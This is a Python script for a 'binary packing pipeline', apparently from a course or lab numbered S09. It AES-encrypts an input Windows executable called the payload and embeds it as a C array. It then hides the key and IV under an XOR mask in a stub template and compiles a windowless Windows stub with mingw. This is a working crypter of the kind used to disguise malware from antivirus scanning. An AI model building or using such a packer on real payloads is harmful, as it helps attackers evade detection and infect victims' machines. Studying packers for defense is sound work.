#!/usr/bin/env python3
# pipeline.py
# Usage: python3 pipeline.py <input.exe>
# Output: stub.exe

import os, sys, subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

XOR_MASK = 0xAA

def step1_pack(input_path: str) -> tuple:
    """AES encrypt payload.exe → payload.enc"""
    print("[*] Step 1: Packing payload...")

    KEY = os.urandom(16)
    IV  = os.urandom(16)

    with open(input_path, "rb") as f:
        pe_data = f.read()

    cipher    = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted = cipher.encrypt(pad(pe_data, AES.block_size))

    with open("payload.enc", "wb") as f:
        f.write(encrypted)

    print(f"[+] payload.enc created ({len(encrypted)} bytes)")
    print(f"[+] KEY: {KEY.hex()}")
    print(f"[+] IV : {IV.hex()}")
    return KEY, IV

def step2_embed() -> None:
    """payload.enc → payload_array.h"""
    print("[*] Step 2: Embedding payload...")

    with open("payload.enc", "rb") as f:
        data = f.read()

    with open("payload_array.h", "w") as f:
        f.write("unsigned char enc_payload[] = {\n")
        for i in range(0, len(data), 16):
            chunk = data[i:i+16]
            f.write("    " + ", ".join(f"0x{b:02x}" for b in chunk) + ",\n")
        f.write("};\n")
        f.write(f"unsigned int enc_payload_len = {len(data)};\n")

    print(f"[+] payload_array.h created")

def step3_gen_stub(KEY: bytes, IV: bytes) -> None:
    """Điền key vào stub_template.cpp → stub_final.cpp"""
    print("[*] Step 3: Generating stub...")

    raw_key_xor = [b ^ XOR_MASK for b in KEY]
    raw_iv_xor  = [b ^ XOR_MASK for b in IV]

    key_str = ", ".join(hex(b) for b in raw_key_xor)
    iv_str  = ", ".join(hex(b) for b in raw_iv_xor)

    with open("stub.cpp", "r") as f:
        template = f.read()

    stub_final = template.replace(
        'unsigned char raw_key[] = {0x00}; // REPLACE',
        f'unsigned char raw_key[] = {{{key_str}}};'
    ).replace(
        'unsigned char raw_iv[]  = {0x00}; // REPLACE',
        f'unsigned char raw_iv[]  = {{{iv_str}}};'
    )

    with open("stub_final.cpp", "w") as f:
        f.write(stub_final)

    print(f"[+] stub_final.cpp generated")

def step4_compile() -> None:
    """Compile stub_final.cpp → stub.exe"""
    print("[*] Step 4: Compiling stub...")

    result = subprocess.run(
        ["x86_64-w64-mingw32-g++", "stub_final.cpp", "-o", "stub.exe",
         "-lbcrypt", "-mwindows"],
        capture_output=True, text=True
    )

    if result.returncode != 0:
        print(f"[-] Compile error:\n{result.stderr}")
        sys.exit(1)

    size = os.path.getsize("stub.exe")
    print(f"[+] stub.exe compiled ({size} bytes)")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 pipeline.py <input.exe>")
        sys.exit(1)

    input_path = sys.argv[1]
    if not os.path.exists(input_path):
        print(f"[-] File not found: {input_path}")
        sys.exit(1)

    print(f"\n{'='*50}")
    print(f"  S09 Binary Packing Pipeline")
    print(f"  Input: {input_path}")
    print(f"{'='*50}\n")

    KEY, IV = step1_pack(input_path)
    step2_embed()
    step3_gen_stub(KEY, IV)
    step4_compile()

    print(f"\n{'='*50}")
    print(f"[+] Done! Output: stub.exe")
    print(f"{'='*50}\n")

if __name__ == "__main__":
    main()
